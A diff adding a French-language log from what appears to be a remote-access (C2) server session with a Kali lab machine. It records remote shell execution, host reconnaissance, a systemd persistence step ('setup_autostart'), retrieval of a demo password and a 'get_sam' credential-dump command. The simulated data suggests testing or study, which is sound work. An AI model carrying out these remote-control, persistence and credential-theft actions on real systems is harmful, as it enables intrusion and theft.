@@ -1,0 +1,103 @@
+2025-11-09 06:08:16 - === NOUVELLE SESSION ===
+2025-11-09 06:08:16 - Client: kali (Linux)
+2025-11-09 06:08:16 - IP: ('192.168.100.3', 43014)
+
+2025-11-09 06:08:16 - 
+>>> Commande envoyée: whoami (ID: 1)
+2025-11-09 06:08:16 - <<< Réponse (Status: ok):
+2025-11-09 06:08:16 - root
+2025-11-09 06:08:16 - --------------------------------------------------------------------------------
+2025-11-09 06:08:17 - 
+>>> Commande envoyée: get_ips (ID: 2)
+2025-11-09 06:08:17 - <<< Réponse (Status: ok):
+2025-11-09 06:08:17 - lo:::1
+eth0:10.0.2.15
+eth0:fd17:625c:f037:2:997b:ab7c:f29f:60b3
+eth0:fe80::ff31:8e6d:65aa:9c54%eth0
+eth1:192.168.100.3
+2025-11-09 06:08:17 - --------------------------------------------------------------------------------
+2025-11-09 06:08:17 - 
+>>> Commande envoyée: list (ID: 3)
+2025-11-09 06:08:17 -     Arguments: {'path': '/home', 'max_depth': 1}
+2025-11-09 06:08:17 - <<< Réponse (Status: ok):
+2025-11-09 06:08:17 - /home:
+  <dir> kali
+/home/kali:
+  <dir> .pki
+  <dir> .local
+  <dir> .mozilla
+  <dir> Videos
+  <dir> Music
+  <dir> .cache
+  <dir> .vscode-oss
+  <dir> .config
+  <dir> .java
+  <dir> Downloads
+  <dir> Public
+  <dir> .gnupg
+  <dir> .BurpSuite
+  <dir> Templates
+  <dir> Pictures
+  <dir> Desktop
+  <dir> Documents
+  <dir> PyCharmMiscProject
+  .vboxclient-clipboard-tty7-service.pid
+  .xsession-errors.old
+  .dmrc
+  .python_history
+  .bashrc.original
+  .vboxclient-display-svga-x11-tty7-control.pid
+  .vboxclient-draganddrop-tty7-service.pid
+  .profile
+  .zprofile
+  .wget-hsts
+  .face
+  .vboxclient-draganddrop-tty7-control.pid
+  .Xauthority
+  .vboxclient-display-svga-x11-tty7-service.pid
+  .sudo_as_admin_successful
+  .bash_logout
+  .vboxclient-seamless-tty7-control.pid
+  .ICEauthority
+  .vboxclient-clipboard-tty7-control.pid
+  .zshrc
+  .vboxclient-vmsvga-session-tty7-control.pid
+  .vboxclient-hostversion-tty7-control.pid
+  .face.icon
+  .bashrc
+  .vboxclient-seamless-tty7-service.pid
+  .xsession-errors
+  .zsh_history
+  ip_info.txt
+2025-11-09 06:08:17 - --------------------------------------------------------------------------------
+2025-11-09 06:08:18 - 
+>>> Commande envoyée: uptime (ID: 4)
+2025-11-09 06:08:18 - <<< Réponse (Status: ok):
+2025-11-09 06:08:18 - up 0h 27m (from /proc/uptime)
+2025-11-09 06:08:18 - --------------------------------------------------------------------------------
+2025-11-09 06:08:18 - 
+>>> Commande envoyée: screenshot (ID: 5)
+2025-11-09 06:08:18 - <<< Réponse (Status: ok):
+2025-11-09 06:08:18 - mss not installed (pip install mss)
+2025-11-09 06:08:18 - --------------------------------------------------------------------------------
+2025-11-09 06:08:19 - 
+>>> Commande envoyée: run_shell (ID: 6)
+2025-11-09 06:08:19 -     Arguments: {'command': 'echo hello from server'}
+2025-11-09 06:08:19 - <<< Réponse (Status: ok):
+2025-11-09 06:08:19 - hello from server
+2025-11-09 06:08:19 - --------------------------------------------------------------------------------
+2025-11-09 06:08:19 - 
+>>> Commande envoyée: setup_autostart (ID: 7)
+2025-11-09 06:08:19 - <<< Réponse (Status: ok):
+2025-11-09 06:08:19 - systemd user service created at /root/.config/systemd/user/agent_ws.service (enable with: systemctl --user enable --now agent_ws)
+2025-11-09 06:08:19 - --------------------------------------------------------------------------------
+2025-11-09 06:08:20 - 
+>>> Commande envoyée: get_simulated_sensitive (ID: 8)
+2025-11-09 06:08:20 - <<< Réponse (Status: ok):
+2025-11-09 06:08:20 - Simulated sensitive data: DEMO_PASSWORD_12345
+2025-11-09 06:08:20 - --------------------------------------------------------------------------------
+2025-11-09 06:08:20 - 
+>>> Commande envoyée: get_sam (ID: 9)
+2025-11-09 06:08:20 - <<< Réponse (Status: ok):
+2025-11-09 06:08:20 - (commande Windows uniquement)
+2025-11-09 06:08:20 - --------------------------------------------------------------------------------
